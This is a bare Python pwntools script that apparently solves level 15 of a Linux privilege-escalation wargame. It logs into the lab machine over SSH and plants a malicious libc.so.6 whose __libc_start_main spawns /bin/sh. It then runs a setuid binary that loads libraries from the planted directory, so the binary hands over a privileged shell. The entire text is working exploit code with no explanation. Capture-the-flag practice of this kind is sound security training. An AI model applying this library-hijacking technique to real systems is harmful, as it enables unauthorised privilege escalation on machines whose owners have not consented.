#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level15 = ssh(host=argv[1],user='level15',password='level15')
level15_shell = level15.shell('sh')
level15_shell.sendline("""echo -e '#include <stdio.h>\n__libc_start_main() {\nsystem("/bin/sh");\n}' > /var/tmp/flag15/lib.c""")
level15_shell.sendline("echo 'GLIBC_2.0 {};' > /var/tmp/flag15/version.txt")
level15_shell.sendline("gcc -shared -static-libgcc -Wl,--version-script=/var/tmp/flag15/version.txt,-Bstatic /var/tmp/flag15/lib.c -o /var/tmp/flag15/libc.so.6")
level15_shell.sendline("/home/flag15/flag15")
level15_shell.sendline("getflag")
level15_shell.interactive()